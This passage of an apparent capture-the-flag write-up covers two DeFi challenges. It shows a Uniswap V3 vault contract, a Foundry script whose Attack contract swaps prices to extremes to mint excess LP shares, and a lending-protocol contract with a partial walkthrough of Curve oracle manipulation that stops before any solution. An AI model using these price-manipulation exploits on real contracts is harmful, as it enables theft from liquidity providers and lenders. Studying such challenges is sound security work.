        emit Deposit(msg.sender, to, shares, amount0, amount1);
        require(totalSupply() <= maxTotalSupply, "maxTotalSupply");
    }

    function _poke(int24 tickLower, int24 tickUpper) internal {
        (uint128 liquidity, , , , ) = _position(tickLower, tickUpper);
        if (liquidity > 0) {
            pool.burn(tickLower, tickUpper, 0);
        }
    }

    function _calcSharesAndAmounts(uint256 amount0Desired, uint256 amount1Desired)
        internal
        view
        returns (
            uint256 shares,
            uint256 amount0,
            uint256 amount1
        )
    {
        (uint256 total0, uint256 total1) = getTotalAmounts();
        
        // If total supply > 0, vault can't be empty
        assert(totalSupply() == 0 || total0 > 0 || total1 > 0);

        if (totalSupply() == 0) {
            // For first deposit, just use the amounts desired
            amount0 = amount0Desired;
            amount1 = amount1Desired;
            shares = Math.max(amount0, amount1);
        } else if (total0 == 0) {
            amount1 = amount1Desired;
            shares = FullMath.mulDiv(amount1, totalSupply(), total1);
        } else if (total1 == 0) {
            amount0 = amount0Desired;
            shares = FullMath.mulDiv(amount0, totalSupply(), total0);
        } else {
            uint256 cross = Math.min(amount0Desired * total1, amount1Desired * total0);
            require(cross > 0, "cross");

            // Round up amounts
            amount0 = (cross - 1) / total1 + 1;
            amount1 = (cross - 1) / total0 + 1;
            shares = cross * totalSupply() / total0 / total1;
        }
    }

    function withdraw(
        uint256 shares,
        uint256 amount0Min,
        uint256 amount1Min,
        address to
    ) external nonReentrant returns (uint256 amount0, uint256 amount1) {
        require(shares > 0, "shares");
        require(to != address(0) && to != address(this), "to");

        // Burn shares
        _burn(msg.sender, shares);

        // Calculate token amounts proportional to unused balances
        uint256 unusedAmount0 = FullMath.mulDiv(getBalance0(), shares, totalSupply());
        uint256 unusedAmount1 = FullMath.mulDiv(getBalance1(), shares, totalSupply());

        // Withdraw proportion of liquidity from Uniswap pool
        (uint256 baseAmount0, uint256 baseAmount1) =
            _burnLiquidityShare(baseLower, baseUpper, shares, totalSupply());

        // Sum up total amounts owed to recipient
        amount0 = unusedAmount0 + baseAmount0;
        amount1 = unusedAmount1 + baseAmount1;
        require(amount0 >= amount0Min, "amount0Min");
        require(amount1 >= amount1Min, "amount1Min");

        // Push tokens to recipient
        if (amount0 > 0) token0.transfer(to, amount0);
        if (amount1 > 0) token1.transfer(to, amount1);

        emit Withdraw(msg.sender, to, shares, amount0, amount1);
    }

    function _burnLiquidityShare(
        int24 tickLower,
        int24 tickUpper,
        uint256 shares,
        uint256 _totalSupply
    ) internal returns (uint256 amount0, uint256 amount1) {
        (uint128 totalLiquidity, , , , ) = _position(tickLower, tickUpper);
        uint256 liquidity = FullMath.mulDiv(uint256(totalLiquidity), shares, _totalSupply);

        if (liquidity > 0) {
            (uint256 burned0, uint256 burned1, uint256 fees0, uint256 fees1) =
                _burnAndCollect(tickLower, tickUpper, _toUint128(liquidity));

            // Add share of fees
            amount0 = burned0 + FullMath.mulDiv(fees0, shares, _totalSupply);
            amount1 = burned1 + FullMath.mulDiv(fees1, shares, _totalSupply);
        }
    }

    function rebalance() external nonReentrant {
        (, int24 tick, , , , , ) = pool.slot0();
        int24 diff = tick > lastTick ? tick - lastTick : lastTick - tick;
        require(diff >= 5 * tickSpacing, "price diff");

        int24 _baseLower = (tick - int24(10) * tickSpacing) / tickSpacing * tickSpacing > TickMath.MIN_TICK 
            ? (tick - int24(10) * tickSpacing) / tickSpacing * tickSpacing : TickMath.MIN_TICK;
        int24 _baseUpper = (tick + int24(10) * tickSpacing) / tickSpacing * tickSpacing < TickMath.MAX_TICK 
            ? (tick + int24(10) * tickSpacing) / tickSpacing * tickSpacing : TickMath.MAX_TICK;

        // Withdraw all current liquidity from Uniswap pool
        {
            (uint128 baseLiquidity, , , , ) = _position(baseLower, baseUpper);
            _burnAndCollect(baseLower, baseUpper, baseLiquidity);
        }

        // Emit snapshot to record balances and supply
        uint256 balance0 = getBalance0();
        uint256 balance1 = getBalance1();
        emit Snapshot(tick, balance0, balance1, totalSupply());

        // Place base order on Uniswap
        uint128 liquidity = _liquidityForAmounts(_baseLower, _baseUpper, balance0, balance1);
        _mintLiquidity(_baseLower, _baseUpper, liquidity);
        lastTick = tick;
        (baseLower, baseUpper) = (_baseLower, _baseUpper);
    }

    function _burnAndCollect(
        int24 tickLower,
        int24 tickUpper,
        uint128 liquidity
    )
        internal
        returns (
            uint256 burned0,
            uint256 burned1,
            uint256 feesToVault0,
            uint256 feesToVault1
        )
    {
        if (liquidity > 0) {
            (burned0, burned1) = pool.burn(tickLower, tickUpper, liquidity);
        }

        // Collect all owed tokens including earned fees
        (uint256 collect0, uint256 collect1) =
            pool.collect(
                address(this),
                tickLower,
                tickUpper,
                type(uint128).max,
                type(uint128).max
            );

        feesToVault0 = collect0 - burned0;
        feesToVault1 = collect1 - burned1;
        uint256 feesToProtocol0;
        uint256 feesToProtocol1;

        // Update accrued protocol fees
        uint256 _protocolFee = protocolFee;
        if (_protocolFee > 0) {
            feesToProtocol0 = FullMath.mulDiv(feesToVault0, _protocolFee, 1e6);
            feesToProtocol1 = FullMath.mulDiv(feesToVault1, _protocolFee, 1e6);
            feesToVault0 = feesToVault0 - feesToProtocol0;
            feesToVault1 = feesToVault1 - feesToProtocol1;
            accruedProtocolFees0 = accruedProtocolFees0 + feesToProtocol0;
            accruedProtocolFees1 = accruedProtocolFees1 + feesToProtocol1;
        }
        emit CollectFees(feesToVault0, feesToVault1, feesToProtocol0, feesToProtocol1);
    }

    function _mintLiquidity(
        int24 tickLower,
        int24 tickUpper,
        uint128 liquidity
    ) internal {
        if (liquidity > 0) {
            pool.mint(address(this), tickLower, tickUpper, liquidity, "");
        }
    }

    function getTotalAmounts() public view returns (uint256 total0, uint256 total1) {
        (uint256 baseAmount0, uint256 baseAmount1) = getPositionAmounts(baseLower, baseUpper);
        total0 = getBalance0() + baseAmount0;
        total1 = getBalance1() + baseAmount1;
    }

    function getPositionAmounts(int24 tickLower, int24 tickUpper)
        public
        view
        returns (uint256 amount0, uint256 amount1)
    {
        (uint128 liquidity, , , uint128 tokensOwed0, uint128 tokensOwed1) =
            _position(tickLower, tickUpper);
        (amount0, amount1) = _amountsForLiquidity(tickLower, tickUpper, liquidity);

        // Subtract protocol fees
        uint256 oneMinusFee = uint256(1e6) - protocolFee;
        amount0 = amount0 + (uint256(tokensOwed0) * oneMinusFee / 1e6);
        amount1 = amount1 + (uint256(tokensOwed1) * oneMinusFee / 1e6);
    }

    function getBalance0() public view returns (uint256) {
        return token0.balanceOf(address(this)) - accruedProtocolFees0;
    }

    function getBalance1() public view returns (uint256) {
        return token1.balanceOf(address(this)) - accruedProtocolFees1;
    }

    function _position(int24 tickLower, int24 tickUpper)
        internal
        view
        returns (
            uint128,
            uint256,
            uint256,
            uint128,
            uint128
        )
    {
        bytes32 positionKey = PositionKey.compute(address(this), tickLower, tickUpper);
        return pool.positions(positionKey);
    }

    function _amountsForLiquidity(
        int24 tickLower,
        int24 tickUpper,
        uint128 liquidity
    ) internal view returns (uint256, uint256) {
        (uint160 sqrtRatioX96, , , , , , ) = pool.slot0();
        return
            LiquidityAmounts.getAmountsForLiquidity(
                sqrtRatioX96,
                TickMath.getSqrtRatioAtTick(tickLower),
                TickMath.getSqrtRatioAtTick(tickUpper),
                liquidity
            );
    }

    function _liquidityForAmounts(
        int24 tickLower,
        int24 tickUpper,
        uint256 amount0,
        uint256 amount1
    ) internal view returns (uint128) {
        (uint160 sqrtRatioX96, , , , , , ) = pool.slot0();
        return
            LiquidityAmounts.getLiquidityForAmounts(
                sqrtRatioX96,
                TickMath.getSqrtRatioAtTick(tickLower),
                TickMath.getSqrtRatioAtTick(tickUpper),
                amount0,
                amount1
            );
    }

    function _toUint128(uint256 x) internal pure returns (uint128) {
        assert(x <= type(uint128).max);
        return uint128(x);
    }

    function uniswapV3MintCallback(
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        require(msg.sender == address(pool));
        if (amount0 > 0) token0.transfer(msg.sender, amount0);
        if (amount1 > 0) token1.transfer(msg.sender, amount1);
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external override {
        require(msg.sender == address(pool));
        if (amount0Delta > 0) token0.transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) token1.transfer(msg.sender, uint256(amount1Delta));
    }

    function collectProtocol(
        uint256 amount0,
        uint256 amount1,
        address to
    ) external onlyGovernance {
        accruedProtocolFees0 = accruedProtocolFees0 - amount0;
        accruedProtocolFees1 = accruedProtocolFees1 - amount1;
        if (amount0 > 0) token0.transfer(to, amount0);
        if (amount1 > 0) token1.transfer(to, amount1);
    }

    function sweep(
        IERC20 token,
        uint256 amount,
        address to
    ) external onlyGovernance {
        require(token != token0 && token != token1, "token");
        token.transfer(to, amount);
    }

    function setProtocolFee(uint256 _protocolFee) external onlyGovernance {
        require(_protocolFee < 1e6, "protocolFee");
        protocolFee = _protocolFee;
    }

    function setMaxTotalSupply(uint256 _maxTotalSupply) external onlyGovernance {
        maxTotalSupply = _maxTotalSupply;
    }

    function emergencyBurn(
        int24 tickLower,
        int24 tickUpper,
        uint128 liquidity
    ) external onlyGovernance {
        pool.burn(tickLower, tickUpper, liquidity);
        pool.collect(address(this), tickLower, tickUpper, type(uint128).max, type(uint128).max);
    }

    function setGovernance(address _governance) external onlyGovernance {
        pendingGovernance = _governance;
    }

    function acceptGovernance() external {
        require(msg.sender == pendingGovernance, "pendingGovernance");
        governance = msg.sender;
    }

    modifier onlyGovernance {
        require(msg.sender == governance, "governance");
        _;
    }
}
```
{%end%}

## Solution

Uniswap V3 is scary for sure but to break things you don't need to master it. This is an example challege of how you can do yeild farming in Uniswap V3. 

Let's break down the key components and observations of this Yield contract:

1. **Core Functionality**:
   - Implements a yield farming vault for Uniswap V3
   - Manages liquidity positions in a specific price range
   - Allows users to deposit and withdraw tokens
   - Collects and distributes fees from the pool

2. **Key State Variables**:
   - `baseLower` and `baseUpper`: Defines the price range for liquidity provision
   - `lastTick`: Tracks the last price tick for rebalancing
   - `protocolFee`: Fee charged by the protocol (in basis points)
   - `maxTotalSupply`: Maximum allowed LP tokens
   - `accruedProtocolFees`: Tracks fees collected by the protocol

3. **Important Functions**:
   - `deposit()`: Allows users to add liquidity and receive LP tokens
   - `withdraw()`: Lets users withdraw their share of liquidity
   - `rebalance()`: Adjusts the liquidity position based on price changes
   - `_poke()`: Updates the vault's holdings
   - `_calcSharesAndAmounts()`: Calculates LP tokens based on deposits

**Goal Understanding**:
   - We need to get 15e18 LP tokens
   - We're given 5e18 each of token0 and token1

I suspected the following things in the protocol as the potential issues to exploit,
   - The `rebalance()` function has a price movement requirement (`diff >= 5 * tickSpacing`)
   - The `_calcSharesAndAmounts()` function has a potential rounding issue
   - The `deposit()` function's share calculation might be manipulated
   - The compiler version is `solidity ^0.7.0`, i.e, suceptible to integer overflows

1. **Price Manipulation**:
   - The Yield contract uses the pool's price to calculate LP token shares
   - We can manipulate the pool's price by performing large swaps
   - When we swap token0 for token1, we push the price to the minimum (MIN_SQRT_RATIO)
   - When we swap token1 for token0, we push the price to the maximum (MAX_SQRT_RATIO)

2. **Share Calculation Exploit**:
   - The `_calcSharesAndAmounts()` function calculates shares based on the current pool price
   - When the price is manipulated to extreme values, the share calculation becomes inaccurate
   - This allows us to get more LP tokens than we should for our deposit

{% note(clickable=true, header="Yield.s.sol") %}

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@openzeppelin-contracts-3.4.2/contracts/token/ERC20/IERC20.sol";
import {Yield } from "../src/Yield.sol";
contract YieldSolve is Script {
    Yield public yield = Yield(0x59CD84565A441D6551ecb87F7878F4b028AD8e8B);
    IUniswapV3Pool public pool = yield.pool();
    IERC20 public token0 = IERC20(pool.token0());
    IERC20 public token1 = IERC20(pool.token1());
    address player = vm.envAddress("PLAYER");

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Player : ", player);
        console.log("Player balance: ", player.balance);
        console.log("Yield : ", address(yield));
        console.log("Pool : ", address(pool));
        // console.log("token0 : ", address(token0));
        // console.log("token1 : ", address(token1));
        console.log("Pool balance of token0 : ", token0.balanceOf(address(pool)));
        console.log("Pool balance of token1 : ", token1.balanceOf(address(pool)));

        (uint160 sqrtPriceX96,int24 tick,,,,,) = pool.slot0();
        console.log("Pool tick : ", tick);
        console.log("Pool sqrtPriceX96 : ", uint256(sqrtPriceX96));
        // console.log("Token0 price in terms of Token1 : ", 1.0001**tick);
        // console.log("baseLower: ", yield.baseLower());
        // console.log("baseUpper: ", yield.baseUpper());
        // console.log("tickSpacing: ", yield.tickSpacing());

        (uint256 total0, uint256 total1) = yield.getTotalAmounts();
        console.log("total0: ", total0);
        console.log("total1: ", total1);
        console.log("Yield balance of token0 : ", token0.balanceOf(address(yield)));
        console.log("Yield balance of token1 : ", token1.balanceOf(address(yield)));
        console.log("Yield getBalance0() : ", yield.getBalance0());
        console.log("Yield getBalance1() : ", yield.getBalance1());
        console.log("Initial LP tokens : ", yield.totalSupply());
        console.log("Yield accruedProtocolFees0() : ", yield.accruedProtocolFees0());
        console.log("Yield accruedProtocolFees1() : ", yield.accruedProtocolFees1());


        console.log("Player balance of token0 : ", token0.balanceOf(address(player)));
        console.log("Player balance of token1 : ", token1.balanceOf(address(player)));
        console.log("Player balance of LP tokens : ", yield.balanceOf(address(player)));

        token0.approve(address(yield),  14 ether);
        token1.approve(address(yield), 15 ether);
        yield.deposit( 14 ether, 15 ether, 1, 1, player);
        // Repeat the following process until we got more LP tokens
        Attack attack = new Attack(address(yield), player);
        Attack attack = Attack(0xf5420a93FCa0E520E319Dc3f05625c79613be6b0);
        token0.transfer(address(attack), 2 ether);
        token1.transfer(address(attack), 2 ether);
        attack.exploit(true); 
        yield.withdraw(yield.balanceOf(player), 0, 0, player);

        
        (sqrtPriceX96,tick,,,,,) = pool.slot0();
        console.log("Pool tick : ", tick);
        console.log("Pool sqrtPriceX96 : ", uint256(sqrtPriceX96));
        (total0, total1) = yield.getTotalAmounts();
        console.log("total0: ", total0);
        console.log("total1: ", total1);
        console.log("Yield getBalance0() : ", yield.getBalance0());
        console.log("Yield getBalance1() : ", yield.getBalance1());
        console.log("Initial LP tokens : ", yield.totalSupply());

        console.log("Player balance of token0 : ", token0.balanceOf(address(player)));
        console.log("Player balance of token1 : ", token1.balanceOf(address(player)));
        console.log("Player balance of LP tokens : ", yield.balanceOf(address(player)));

        // console.log("isSolved() : ", yield.isSolved());
        vm.stopBroadcast();
    }
}

contract Attack {
    Yield public yield;
    IUniswapV3Pool public pool;
    IERC20 public token0;
    IERC20 public token1;
    address public player;
    uint160 internal constant MIN_SQRT_RATIO = 4295128739;
    uint160 internal constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;

    constructor(address _yeild, address _player){
        yield = Yield(_yeild);
        pool = yield.pool();
        token0 = IERC20(pool.token0());
        token1 = IERC20(pool.token1());
        player = _player;
    }
    function exploit(bool zeroForOne) public {
        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
        if (zeroForOne){
            uint256 token0bal =  token0.balanceOf(address(this));
            token0.approve(address(pool), token0bal);
            pool.swap(player, true, int256(token0bal), MIN_SQRT_RATIO+1, "");
        }
        else {
            uint256 token1bal =  token1.balanceOf(address(this));
            token1.approve(address(pool), token1bal);
            pool.swap(player, false, int256(token1bal), MAX_SQRT_RATIO-1, "");
        }
        
        token0.transfer(player, token0.balanceOf(address(this)));
        token1.transfer(player, token1.balanceOf(address(this)));

    }
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external  {
        require(msg.sender == address(pool));
        if (amount0Delta > 0) token0.transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) token1.transfer(msg.sender, uint256(amount1Delta));
    }
}
```
{%end%}

The exploit takes advantage of the fact that the Yield contract doesn't properly handle extreme price movements in the underlying Uniswap V3 pool, allowing us to manipulate the LP token calculations to our advantage.
***


# Oracle

P: "Michael wrote a Dex pool for USDe and USDC tokens along with their respective oracles. Then he borrowed a large position from his own pool trusting his own code. The pool is deployed with the same code and params as the actual pool at https://etherscan.io/tx/0x6f4438aa1785589e2170599053a0cdc740d8987746a4b5ad9614b6ab7bb4e550. You are given 10000 tokens of USDe and USDC. Your goal is to get 20000 of USDe.

Might help you: check the differences betweeen the current implementation and the implementation deployed at the pool creation time on mainnet"

{% note(clickable=true, header="Oracle.sol") %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin-contracts-4.8.0/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin-contracts-4.8.0/contracts/access/Ownable.sol";
import "@openzeppelin-contracts-4.8.0/contracts/utils/math/Math.sol";

interface ICurve {
    function add_liquidity(
        uint256[] calldata amounts,
        uint256 min_mint_amount
    ) external returns (uint256);

    function remove_liquidity_imbalance(
        uint256[] calldata amounts,
        uint256 max_burn_amount
    ) external returns (uint256);

    function price_oracle(uint256 idx) external view returns (uint256);
    function last_price(uint256 idx) external view returns (uint256);
    function coins(uint256 idx) external view returns (address);
    function balanceOf(address owner) external view returns (uint256);
    // function lp_token() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);

    function exchange(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy
    ) external returns (uint256);
}

interface IPriceOracle {
    function getAssetPrice(uint256 _assetId) external view returns (uint256);
}

contract SimplePriceOracle is IPriceOracle, Ownable {
    uint256 public price;

    constructor(uint256 _price) Ownable() {
        price = _price;
    }

    function setPrice(uint256 _price) external onlyOwner {
        price = _price;
    }

    function getAssetPrice(uint256 _assetId) external view returns (uint256) {
        return price;
    }
}

contract CurvePriceOracle is IPriceOracle {
    address public curvePool;
    uint256 public idx;

    constructor(address _curvePool, uint256 _idx, uint256 anchor) {
        curvePool = _curvePool;

        uint256 absDiff = 0;
        if (ICurve(curvePool).price_oracle(_idx) > anchor) {
            absDiff = ICurve(curvePool).price_oracle(_idx) - anchor;
        } else {
            absDiff = anchor - ICurve(curvePool).price_oracle(_idx);
        }
        require(absDiff <= 1e8, "Price oracle has been manipulated :(");
    }

    function getAssetPrice(uint256 _assetId) external view returns (uint256) {
        return ICurve(curvePool).price_oracle(idx);
    }

    function getSpotPrice() external view returns (uint256) {
        return ICurve(curvePool).last_price(idx);
    }
}

contract Oracle is ReentrancyGuard, Ownable {
    struct Asset {
        IERC20 token;
        uint256 totalDeposited;
        uint256 totalBorrowed;
        uint256 baseRate;
    }

    struct UserAccount {
        mapping(uint256 => uint256) deposited;
        mapping(uint256 => uint256) borrowed;
        mapping(uint256 => uint256) lastInterestBlock;
    }

    mapping(address => UserAccount) userAccounts;
    mapping(uint256 => Asset) public assets;
    uint256 public assetCount;
    address public player;

    uint256 public constant LIQUIDATION_CLOSE_FACTOR = 100; // 100% of the borrow can be liquidated
    uint256 public constant PRECISION = 1e18;
    uint256 public constant MAX_LOOPS = 10;
    uint256 public constant BAD_DEBT_RATIO = 110;
    uint256 public constant MIN_HEALTH_FACTOR = 1.05e18;

    mapping(uint256 => address) public priceOracles;

    event AssetAdded(uint256 indexed assetId, address indexed token);
    event Deposit(address indexed user, uint256 indexed assetId, uint256 amount);
    event Withdraw(address indexed user, uint256 indexed assetId, uint256 amount);
    event Borrow(address indexed user, uint256 indexed assetId, uint256 amount);
    event Repay(address indexed user, uint256 indexed assetId, uint256 amount);
    event Liquidate(
        address indexed liquidator,
        address indexed borrower,
        uint256 indexed assetId,
        uint256 amount,
        uint256 collateralAssetId,
        uint256 collateralAmount
    );

    constructor(address _player) Ownable() {
        player = _player;
    }

    function isSolved() external view returns (bool) {
        return assets[0].token.balanceOf(address(player)) >= 20000 ether;
    }

    function getUserAccount(address user, uint256 depositAssetId, uint256 borrowAssetId, uint256 interestAssetId) external view returns (uint256, uint256, uint256) {
        UserAccount storage account = userAccounts[user];
        return (account.deposited[depositAssetId], account.borrowed[borrowAssetId], account.lastInterestBlock[interestAssetId]);
    }

    function addAsset(
        address _token,
        uint256 _baseRate
    ) external onlyOwner {
        assets[assetCount] = Asset({
            token: IERC20(_token),
            totalDeposited: 0,
            totalBorrowed: 0,
            baseRate: _baseRate
        });
        emit AssetAdded(assetCount, _token);
        assetCount++;
    }

    function setPriceOracle(uint256 _assetId, address _priceOracle) external onlyOwner {
        priceOracles[_assetId] = _priceOracle;
    }

    function deposit(uint256 _assetId, uint256 _amount) external nonReentrant {
        require(_assetId < assetCount, "Invalid asset");
        require(_amount > 0, "Amount must be greater than 0");

        Asset storage asset = assets[_assetId];
        require(asset.token.transferFrom(msg.sender, address(this), _amount), "Transfer failed");

        updateInterest(msg.sender, _assetId);
        userAccounts[msg.sender].deposited[_assetId] += _amount;
        asset.totalDeposited += _amount;

        emit Deposit(msg.sender, _assetId, _amount);
    }

    function borrow(uint256 _assetId, uint256 _amount) external nonReentrant {
        require(_assetId < assetCount, "Invalid asset");
        require(_amount > 0, "Amount must be greater than 0");

        updateInterest(msg.sender, _assetId);

        UserAccount storage account = userAccounts[msg.sender];
        Asset storage asset = assets[_assetId];

        uint256 newBorrowAmount = account.borrowed[_assetId] + _amount;
        account.borrowed[_assetId] = newBorrowAmount;
        asset.totalBorrowed += _amount;

        uint256 healthFactor = calculateHealthFactor(msg.sender);
        require(healthFactor >= MIN_HEALTH_FACTOR, "Borrow would result in undercollateralization");

        require(asset.token.transfer(msg.sender, _amount), "Transfer failed");

        emit Borrow(msg.sender, _assetId, _amount);
    }

    function liquidate(address _borrower, uint256 _assetId, uint256 _amount, uint256 _collateralAssetId)
        external
        nonReentrant
    {
        require(_assetId < assetCount && _collateralAssetId < assetCount, "Invalid asset");
        require(_amount > 0, "Amount must be greater than 0");
        require(_borrower != msg.sender, "Cannot liquidate own position");
        require(_assetId != _collateralAssetId, "Cannot liquidate same asset");

        updateInterest(_borrower, _assetId);
        updateInterest(_borrower, _collateralAssetId);

        UserAccount storage borrowerAccount = userAccounts[_borrower];
        Asset storage borrowedAsset = assets[_assetId];
        Asset storage collateralAsset = assets[_collateralAssetId];

        uint256 healthFactor = calculateHealthFactor(_borrower);
        require(healthFactor < PRECISION, "Account not liquidatable");

        uint256 maxLiquidatable = borrowerAccount.borrowed[_assetId] * LIQUIDATION_CLOSE_FACTOR / 100;
        uint256 actualLiquidation = Math.min(_amount, maxLiquidatable);

        uint256 realCollateralAmount = actualLiquidation * getAssetPrice(_assetId) / getAssetPrice(_collateralAssetId);
        uint256 collateralAmount = Math.min(realCollateralAmount, borrowerAccount.deposited[_collateralAssetId]);

        uint256 toLiquidate = collateralAmount * getAssetPrice(_collateralAssetId) / getAssetPrice(_assetId);
        if (realCollateralAmount > borrowerAccount.deposited[_collateralAssetId]) {
            toLiquidate = toLiquidate * BAD_DEBT_RATIO / 100;
        }

        require(borrowedAsset.token.transferFrom(msg.sender, address(this), toLiquidate), "Transfer failed");
        require(collateralAsset.token.transfer(msg.sender, collateralAmount), "Transfer failed");

        borrowerAccount.borrowed[_assetId] -= actualLiquidation;
        borrowerAccount.deposited[_collateralAssetId] -= collateralAmount;

        borrowedAsset.totalBorrowed -= actualLiquidation;
        collateralAsset.totalDeposited -= collateralAmount;

        emit Liquidate(msg.sender, _borrower, _assetId, actualLiquidation, _collateralAssetId, collateralAmount);
    }

    function updateInterest(address _user, uint256 _assetId) internal {
        UserAccount storage account = userAccounts[_user];
        Asset storage asset = assets[_assetId];

        if (account.lastInterestBlock[_assetId] == block.number) {
            return;
        }

        uint256 interestRate = getInterestRate(_assetId);
        uint256 blocksSinceLastUpdate = block.number - account.lastInterestBlock[_assetId];
        uint256 interest =
            account.borrowed[_assetId] * interestRate * blocksSinceLastUpdate / (365 days / 15) / PRECISION;
        account.borrowed[_assetId] += interest;
        asset.totalBorrowed += interest;
        account.lastInterestBlock[_assetId] = block.number;
    }

    function getInterestRate(uint256 _assetId) public view returns (uint256) {
        Asset storage asset = assets[_assetId];
        return asset.baseRate;
    }

    function calculateHealthFactor(address _user) public view returns (uint256) {
        uint256 totalCollateralInEth = 0;
        uint256 totalBorrowedInEth = 0;

        for (uint256 i = 0; i < assetCount; i++) {
            Asset storage asset = assets[i];
            UserAccount storage account = userAccounts[_user];

            uint256 collateralInEth = account.deposited[i] * getAssetPrice(i);
            uint256 borrowedInEth = account.borrowed[i] * getAssetPrice(i);

            totalCollateralInEth += collateralInEth;
            totalBorrowedInEth += borrowedInEth;
        }

        if (totalBorrowedInEth == 0) {
            return type(uint256).max;
        }

        return totalCollateralInEth * PRECISION / totalBorrowedInEth;
    }

    function getAssetPrice(uint256 _assetId) public view returns (uint256) {
        if (priceOracles[_assetId] == address(0)) {
            return 0;
        }
        return IPriceOracle(priceOracles[_assetId]).getAssetPrice(_assetId);
    }
}
```
{%end%}

## Solution

An interesting chall, we got a Lending protocol which uses two different price oracles to get the asset price. 

Lets, observe the protocol first, 

1. **Oracle (Main Contract)**
   - A lending protocol that allows users to deposit and borrow assets
   - Manages multiple assets with their respective price oracles
   - Handles liquidations and interest calculations
   - Uses two price oracles to determine asset values for collateralization

2. **SimplePriceOracle**
   - A basic price oracle that returns a fixed price
   - Has an owner who can set the price

3. **CurvePriceOracle**
   - More sophisticated oracle that gets prices from a Curve pool
   - Validates price against an anchor value
   - Can get both oracle price and spot price from the Curve pool

The challenge involves manipulating these contracts to get `20,000 USDe` tokens when starting with `10,000` each of USDe and USDC. As usual let me see the initial state of this protocol,

```bash
  Player :  0xa7048127553Ead5D0408B3C8C068565d1cD46BDb
  assetCount :  2
  ---------------Asset0----------------
  asset0 address:  0x21Bbb929210149d6a849caF486ee0263404056AD
  asset0 totalDeposited0 :  10000000000000000000000
  asset0 totalBorrowed0 :  0
  asset0 baseRate0 :  1
  asset0 priceOracle :  0xaabD0F52b2743ff3AF409f3f19f8626255961699
  -----------------Asset1--------------
  asset1 address:  0xA69af9EC4689Fad31B026c973eBf6Fc68F4c326d
  asset1 totalDeposited1 :  10000000000
  asset1 totalBorrowed1 :  18500000000
  asset1 baseRate1 :  1
  asset1 priceOracle :  0x9a99f79e1517c6ca48cA5B3A1994dB98CFECC29d
  ---------------Owner-----------------
  deposited0 :  10000000000000000000000
  borrowed0 :  0
  lastInterestedBlock0 :  3566869
  deposited1 :  10000000000
  borrowed1 :  18500000000
  lastInterestedBlock1 :  3566869
  asset0 balance :  0
  asset1 balance :  18500000000

  oracle asset0 balance :  90000000000000000000000
  oracle asset1 balance :  71500000000
  ---------------Player-----------------
  deposited0 :  0
  borrowed0 :  0
  lastInterestedBlock0 :  0
  deposited1 :  0
  borrowed1 :  0
  lastInterestedBlock1 :  0
  asset0 balance :  10000000000000000000000
  asset1 balance :  10000000000
  -------------Price Oracles---------------
  simplePriceOracle:  0xaabD0F52b2743ff3AF409f3f19f8626255961699
  simplePriceOracle asset0 Price :  1000000
  curvePriceOracle (asset 1):  0x9a99f79e1517c6ca48cA5B3A1994dB98CFECC29d
  curvePriceOracle Curve Pool :  0x46206ede2b79e862D91BFa0CB4ce21EDFa7fC96f
  Curve asset1 Price :  1000000000000000000
  Curve SpotPrice :  1000000000000000000
  -------------------------------------
  token 0 in curve pool :  0x21Bbb929210149d6a849caF486ee0263404056AD
  token 1 in curve pool :  0xA69af9EC4689Fad31B026c973eBf6Fc68F4c326d
```
Thats a lot of info but,  I need at least this much to understood this protocol. So, looking at the initial state we can confirm that there are only two tokens in the lending Oracle contract and also the CurvePool oracle has also have the same tokens. As per the statement those two assets are `USDe` and `USDC` and we are given with `10000` amount of tokens each.

Can you guess? which one is the `USDe`? `asset0` or `asset1`?

> It's asset0, cause it has the decimals of 18. USDe is 18 decimals and USDC is 6. 

Owner has deposited `10000` of USDe, `10000` of USDC and borrowed `18500` of USDC. 

What should we do?
1. Can we directly `borrow()` `20000` USDe from the Oracle ? Yes If we have sufficient health factor.
2. Can we `liquidate()` owners collatoral and get all his collatoral asset ? Yes If can make owners health factor worse. 

Both of above options depends on the health factor, lets see how the health factor is calculated. 

```solidity
function calculateHealthFactor(address _user) public view returns (uint256) {
    uint256 totalCollateralInEth = 0;
    uint256 totalBorrowedInEth = 0;

    for (uint256 i = 0; i < assetCount; i++) {
        Asset storage asset = assets[i];
        UserAccount storage account = userAccounts[_user];

        uint256 collateralInEth = account.deposited[i] * getAssetPrice(i);
        uint256 borrowedInEth = account.borrowed[i] * getAssetPrice(i);

        totalCollateralInEth += collateralInEth;
        totalBorrowedInEth += borrowedInEth;
    }

    if (totalBorrowedInEth == 0) {
        return type(uint256).max;
    }

    return totalCollateralInEth * PRECISION / totalBorrowedInEth;
}
```

Health factor is being calculated based on the asset prices, Okay lets see how the asset price is fetched.

```solidity
function getAssetPrice(uint256 _assetId) public view returns (uint256) {
    if (priceOracles[_assetId] == address(0)) {
        return 0;
    }
    return IPriceOracle(priceOracles[_assetId]).getAssetPrice(_assetId);
}
```

Interesting, this is using different price oracles for each asset. `SimplePriceOracle` is used for asset0, and `CurvePoolOracle` is used for asset1. `SimplePriceOracle` always returns the same price meaning we can't manipulate this. But the `CurvePoolOracle` is fetching the price using `price_oracle` function of it. 

We have the asset1(USDC), can we directly interact with `CurvePool` and do some deposit kind of thing these and change the price.??

Yes Bro, that's is what the challenge is and that's called `ORACLE MANIPULATION` too.

Let's see is that `CurvePool` is vulnerable to Oracle Manipulation or not?

> There was an hint in the statement, "check the differences betweeen the current implementation and the implementation deployed at the pool creation time on mainnet"

